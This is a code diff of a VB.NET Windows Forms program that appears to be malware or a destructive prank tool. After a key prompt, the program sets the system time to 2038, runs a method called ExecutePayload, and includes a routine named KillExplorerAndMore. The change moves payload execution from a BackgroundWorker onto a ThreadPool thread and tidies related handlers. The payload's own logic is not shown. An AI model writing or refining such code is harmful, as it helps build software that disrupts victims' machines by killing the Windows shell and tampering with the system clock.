@@ -1332,14 +1332,21 @@ Public Class Form1
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
 
-            If Not BwPayloadWorker.IsBusy Then
-                ' Start the background worker
-                BwPayloadWorker.RunWorkerAsync()
-            End If
+            Try
+                LongRunningTask()
+            Catch ex As Exception
+                Console.WriteLine("Error in ExecutePayloadWork: " & ex.Message)
+            End Try
 
         Else
             MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End If
+    End Sub
+
+    Private Sub LongRunningTask()
+        ThreadPool.QueueUserWorkItem(Sub()
+                                         ExecutePayload()
+                                     End Sub)
     End Sub
 
     Private Sub KillExplorerAndMore()
@@ -1380,8 +1387,8 @@ Public Class Form1
         overlay = Nothing
     End Sub
 
-    ' Method to execute the payload using BackgroundWorker
-    Private Sub ExecutePayloadWork()
+    ' Method to execute the payload
+    Private Sub ExecutePayload()
         Try
             Try
                 AnimationTimer.Start()
@@ -1428,7 +1435,7 @@ Public Class Form1
         Catch ex As Exception
             ' General exception handling for the entire ExecutePayload method
             Console.WriteLine("An error occurred in ExecutePayload: " & ex.Message)
-            End Try
+        End Try
     End Sub
 
     ' Event handler for the Exit button
@@ -1461,17 +1468,6 @@ Public Class Form1
 
         Catch ex As Exception
             MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End Try
-    End Sub
-
-    Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
-    End Sub
-
-    Private Sub BwPayloadWorker_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwPayloadWorker.DoWork
-        Try
-            ExecutePayloadWork()
-        Catch ex As Exception
-            Console.WriteLine("Error in ExecutePayloadWork: " & ex.Message)
         End Try
     End Sub
 
